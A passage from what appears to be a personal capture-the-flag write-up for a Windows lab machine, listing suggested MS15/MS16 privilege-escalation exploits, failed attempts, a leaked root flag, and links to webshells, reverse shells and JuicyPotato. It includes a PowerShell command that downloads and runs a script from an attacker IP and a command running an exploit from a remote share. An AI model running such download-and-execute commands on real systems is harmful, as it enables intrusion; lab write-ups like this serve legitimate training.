  [*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
  [*]
  [E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
  [*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
  [*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
  [*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
  [*]
  [E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
  [*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
  [*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
  [*]
  [*] done


MS16-135:
C:\Users\Destitute\Documents&gt; powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.11:8080/MS16-135.ps1')
  --- snip ---
  This script contains malicious content and has been blocked by your antivirus software.

C:\Users\Destitute\Documents&gt; //10.10.14.11/share/41015.exe
  The request is not supported.


MS16-032:
Opens a new console, so only applicable when you have a RDP session.

MS16-016:
Opens a new console, so only applicable when you have a RDP session.


None of the above exploits seem to work. Out of frustration I went ahead an looked on a walkthrough, and sure enough
JuicyPotato was the way to root. Since we can't get it to work, here's the free root.txt:

5737DD2EDC29B5B219BC43E60866BE08


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

SNMP Enum:
  https://book.hacktricks.xyz/pentesting/pentesting-snmp#enumerating-snmp

IKE Enum:
  https://book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting

Strongswan:
  https://wiki.strongswan.org/projects/strongswan/wiki/ConnSection
  https://blog.ruanbekker.com/blog/2018/02/11/setup-a-site-to-site-ipsec-vpn-with-strongswan-and-preshared-key-authentication/

ASP Webshell:
  https://github.com/tennc/webshell/blob/master/asp/webshell.asp

Powershell Reverse:
  https://github.com/samratashok/nishang/tree/master/Shells

JuicyPotato CLSID:
  http://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise/
</code></pre>



</main> <!-- /main -->
<script id="quarto-html-after-body" type="application/javascript">
  window.document.addEventListener("DOMContentLoaded", function (event) {
    const icon = "";
    const anchorJS = new window.AnchorJS();
    anchorJS.options = {
      placement: 'right',
      icon: icon
    };
    anchorJS.add('.anchored');
    const isCodeAnnotation = (el) => {
      for (const clz of el.classList) {
        if (clz.startsWith('code-annotation-')) {                     
          return true;
        }
      }
      return false;
    }
    const onCopySuccess = function(e) {
      // button target
      const button = e.trigger;
      // don't keep focus
      button.blur();
      // flash "checked"
      button.classList.add('code-copy-button-checked');
      var currentTitle = button.getAttribute("title");
      button.setAttribute("title", "Copied!");
      let tooltip;
      if (window.bootstrap) {
        button.setAttribute("data-bs-toggle", "tooltip");
        button.setAttribute("data-bs-placement", "left");
        button.setAttribute("data-bs-title", "Copied!");
        tooltip = new bootstrap.Tooltip(button, 
          { trigger: "manual", 
            customClass: "code-copy-button-tooltip",
            offset: [0, -8]});
        tooltip.show();    
      }
      setTimeout(function() {
        if (tooltip) {
          tooltip.hide();
          button.removeAttribute("data-bs-title");
          button.removeAttribute("data-bs-toggle");
          button.removeAttribute("data-bs-placement");
        }
        button.setAttribute("title", currentTitle);
        button.classList.remove('code-copy-button-checked');
      }, 1000);
      // clear code selection
      e.clearSelection();
    }
    const getTextToCopy = function(trigger) {
        const codeEl = trigger.previousElementSibling.cloneNode(true);
        for (const childEl of codeEl.children) {
          if (isCodeAnnotation(childEl)) {
            childEl.remove();
          }
        }
        return codeEl.innerText;
    }
    const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
      text: getTextToCopy
    });
    clipboard.on('success', onCopySuccess);
    if (window.document.getElementById('quarto-embedded-source-code-modal')) {
      const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
        text: getTextToCopy,
        container: window.document.getElementById('quarto-embedded-source-code-modal')
      });
      clipboardModal.on('success', onCopySuccess);
    }
      var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
      var mailtoRegex = new RegExp(/^mailto:/);
        var filterRegex = new RegExp("https:\/\/exploit\.se");
      var isInternal = (href) => {
          return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
      }
      // Inspect non-navigation links and adorn them if external
     var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
      for (var i=0; i<links.length; i++) {
        const link = links[i];
        if (!isInternal(link.href)) {
          // undo the damage that might have been done by quarto-nav.js in the case of
          // links that we want to consider external
          if (link.dataset.originalHref !== undefined) {
            link.href = link.dataset.originalHref;
          }
        }
      }
    function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
      const config = {
        allowHTML: true,
        maxWidth: 500,
        delay: 100,
        arrow: false,
        appendTo: function(el) {
            return el.parentElement;
        },
        interactive: true,
        interactiveBorder: 10,
        theme: 'quarto',
        placement: 'bottom-start',
      };
      if (contentFn) {
        config.content = contentFn;
      }
      if (onTriggerFn) {
        config.onTrigger = onTriggerFn;
      }
      if (onUntriggerFn) {
        config.onUntrigger = onUntriggerFn;
      }
      window.tippy(el, config); 
    }
    const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
    for (var i=0; i<noterefs.length; i++) {
      const ref = noterefs[i];
      tippyHover(ref, function() {
        // use id or data attribute instead here
        let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
        try { href = new URL(href).hash; } catch {}
        const id = href.replace(/^#\/?/, "");
        const note = window.document.getElementById(id);
        if (note) {
          return note.innerHTML;
        } else {
          return "";
        }
      });
    }
    const xrefs = window.document.querySelectorAll('a.quarto-xref');
    const processXRef = (id, note) => {
      // Strip column container classes
      const stripColumnClz = (el) => {
        el.classList.remove("page-full", "page-columns");
        if (el.children) {
          for (const child of el.children) {
            stripColumnClz(child);
          }
        }
      }
      stripColumnClz(note)
      if (id === null || id.startsWith('sec-')) {
        // Special case sections, only their first couple elements
        const container = document.createElement("div");
        if (note.children && note.children.length > 2) {
          container.appendChild(note.children[0].cloneNode(true));
          for (let i = 1; i < note.children.length; i++) {
            const child = note.children[i];
            if (child.tagName === "P" && child.innerText === "") {
              continue;
            } else {
              container.appendChild(child.cloneNode(true));
              break;
            }
          }
          if (window.Quarto?.typesetMath) {
            window.Quarto.typesetMath(container);
          }
          return container.innerHTML
        } else {
          if (window.Quarto?.typesetMath) {
            window.Quarto.typesetMath(note);
          }
          return note.innerHTML;
        }
      } else {
        // Remove any anchor links if they are present
        const anchorLink = note.querySelector('a.anchorjs-link');
        if (anchorLink) {
          anchorLink.remove();
        }
        if (window.Quarto?.typesetMath) {
          window.Quarto.typesetMath(note);
        }
        if (note.classList.contains("callout")) {
          return note.outerHTML;
        } else {
          return note.innerHTML;
        }
      }
    }
    for (var i=0; i<xrefs.length; i++) {
      const xref = xrefs[i];
      tippyHover(xref, undefined, function(instance) {
        instance.disable();
        let url = xref.getAttribute('href');
        let hash = undefined; 
        if (url.startsWith('#')) {
          hash = url;
        } else {
          try { hash = new URL(url).hash; } catch {}
        }
        if (hash) {
          const id = hash.replace(/^#\/?/, "");
          const note = window.document.getElementById(id);
          if (note !== null) {
            try {
              const html = processXRef(id, note.cloneNode(true));
              instance.setContent(html);
            } finally {
              instance.enable();
              instance.show();
            }
          } else {
            // See if we can fetch this
            fetch(url.split('#')[0])
            .then(res => res.text())
            .then(html => {
              const parser = new DOMParser();
              const htmlDoc = parser.parseFromString(html, "text/html");
              const note = htmlDoc.getElementById(id);
              if (note !== null) {
                const html = processXRef(id, note);
                instance.setContent(html);
              } 
            }).finally(() => {
              instance.enable();
              instance.show();
            });
          }
        } else {
          // See if we can fetch a full url (with no hash to target)
          // This is a special case and we should probably do some content thinning / targeting
          fetch(url)
          .then(res => res.text())
          .then(html => {
            const parser = new DOMParser();
            const htmlDoc = parser.parseFromString(html, "text/html");
            const note = htmlDoc.querySelector('main.content');
            if (note !== null) {
              // This should only happen for chapter cross references
              // (since there is no id in the URL)
              // remove the first header
              if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
                note.children[0].remove();
              }
              const html = processXRef(null, note);
              instance.setContent(html);
            } 
          }).finally(() => {
            instance.enable();
            instance.show();
          });
        }
      }, function(instance) {
      });
    }
        let selectedAnnoteEl;
        const selectorForAnnotation = ( cell, annotation) => {
          let cellAttr = 'data-code-cell="' + cell + '"';
          let lineAttr = 'data-code-annotation="' +  annotation + '"';
          const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
          return selector;
        }
        const selectCodeLines = (annoteEl) => {
          const doc = window.document;
          const targetCell = annoteEl.getAttribute("data-target-cell");
          const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
          const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
          const lines = annoteSpan.getAttribute("data-code-lines").split(",");
          const lineIds = lines.map((line) => {
            return targetCell + "-" + line;
          })
          let top = null;
          let height = null;
          let parent = null;
          if (lineIds.length > 0) {
              //compute the position of the single el (top and bottom and make a div)
              const el = window.document.getElementById(lineIds[0]);
              top = el.offsetTop;
              height = el.offsetHeight;
              parent = el.parentElement.parentElement;
            if (lineIds.length > 1) {
              const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
              const bottom = lastEl.offsetTop + lastEl.offsetHeight;
              height = bottom - top;
            }
            if (top !== null && height !== null && parent !== null) {
              // cook up a div (if necessary) and position it 
              let div = window.document.getElementById("code-annotation-line-highlight");
              if (div === null) {
                div = window.document.createElement("div");
                div.setAttribute("id", "code-annotation-line-highlight");
                div.style.position = 'absolute';
                parent.appendChild(div);
              }
              div.style.top = top - 2 + "px";
              div.style.height = height + 4 + "px";
              div.style.left = 0;
              let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
              if (gutterDiv === null) {
                gutterDiv = window.document.createElement("div");
                gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
                gutterDiv.style.position = 'absolute';
                const codeCell = window.document.getElementById(targetCell);
                const gutter = codeCell.querySelector('.code-annotation-gutter');
                gutter.appendChild(gutterDiv);
              }
              gutterDiv.style.top = top - 2 + "px";
              gutterDiv.style.height = height + 4 + "px";
            }
            selectedAnnoteEl = annoteEl;
          }
        };
        const unselectCodeLines = () => {
          const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
          elementsIds.forEach((elId) => {
            const div = window.document.getElementById(elId);
            if (div) {
              div.remove();
            }
          });
          selectedAnnoteEl = undefined;
        };
          // Handle positioning of the toggle
      window.addEventListener(
        "resize",
        throttle(() => {
          elRect = undefined;
          if (selectedAnnoteEl) {
            selectCodeLines(selectedAnnoteEl);
          }
        }, 10)
      );
      function throttle(fn, ms) {
      let throttle = false;
      let timer;
        return (...args) => {
          if(!throttle) { // first call gets through
              fn.apply(this, args);
              throttle = true;
          } else { // all the others get throttled
              if(timer) clearTimeout(timer); // cancel #2
              timer = setTimeout(() => {
                fn.apply(this, args);
                timer = throttle = false;
              }, ms);
          }
        };
      }
        // Attach click handler to the DT
        const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
        for (const annoteDlNode of annoteDls) {
          annoteDlNode.addEventListener('click', (event) => {
            const clickedEl = event.target;
            if (clickedEl !== selectedAnnoteEl) {
              unselectCodeLines();
              const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
              if (activeEl) {
                activeEl.classList.remove('code-annotation-active');
              }
              selectCodeLines(clickedEl);
              clickedEl.classList.add('code-annotation-active');
            } else {
              // Unselect the line
              unselectCodeLines();
              clickedEl.classList.remove('code-annotation-active');
            }
          });
        }
    const findCites = (el) => {
      const parentEl = el.parentElement;
      if (parentEl) {
        const cites = parentEl.dataset.cites;
        if (cites) {
          return {
            el,
            cites: cites.split(' ')
          };
        } else {
          return findCites(el.parentElement)
        }
      } else {
        return undefined;
      }
    };
    var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
    for (var i=0; i<bibliorefs.length; i++) {
      const ref = bibliorefs[i];
      const citeInfo = findCites(ref);
      if (citeInfo) {
        tippyHover(citeInfo.el, function() {
          var popup = window.document.createElement('div');
          citeInfo.cites.forEach(function(cite) {
            var citeDiv = window.document.createElement('div');
            citeDiv.classList.add('hanging-indent');
            citeDiv.classList.add('csl-entry');
            var biblioDiv = window.document.getElementById('ref-' + cite);
            if (biblioDiv) {
              citeDiv.innerHTML = biblioDiv.innerHTML;
            }
            popup.appendChild(citeDiv);
          });
          return popup.innerHTML;
        });
      }
    }
  });
  </script>
</div> <!-- /content -->
<footer class="footer">
  <div class="nav-footer">
    <div class="nav-footer-left">
      &nbsp;
    </div>   
    <div class="nav-footer-center">
      <ul class="footer-items list-unstyled">
    <li class="nav-item">
 © 2025 0xPThree - All Rights Reserved.
  </li>  
</ul>
    </div>
    <div class="nav-footer-right">
      <ul class="footer-items list-unstyled">
    <li class="nav-item compact">
    <a class="nav-link" href="https://signal.me/#eu/PjVScis0spvu9_S_xNysergThKuqsWQFOwQ7xisr7HJgaJT69xC0Ku2fo3Ng0B1">
      <i class="bi bi-signal" role="img">
</i> 
    </a>
  </li>  
    <li class="nav-item compact">
    <a class="nav-link" href="https://github.com/0xpthree">
      <i class="bi bi-github" role="img">
</i> 
    </a>
  </li>  
    <li class="nav-item compact">
    <a class="nav-link" href="../../index.xml">
      <i class="bi bi-rss" role="img">
</i> 
    </a>
  </li>  
</ul>
    </div>
  </div>
</footer>




</body></html>